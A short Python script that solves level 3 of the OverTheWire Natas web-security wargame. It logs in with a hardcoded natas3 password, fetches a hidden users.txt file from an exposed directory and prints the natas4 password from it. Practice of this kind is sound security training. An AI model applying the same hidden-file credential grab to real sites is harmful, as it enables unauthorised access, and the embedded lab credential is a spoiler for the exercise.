#! /usr/bin/python

import requests
import re

username = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

r = requests.get('http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt', auth=(username, password))
pattern = r'natas4:(\w+)'
result = re.search(pattern, str(r.content))

print result.group(1)
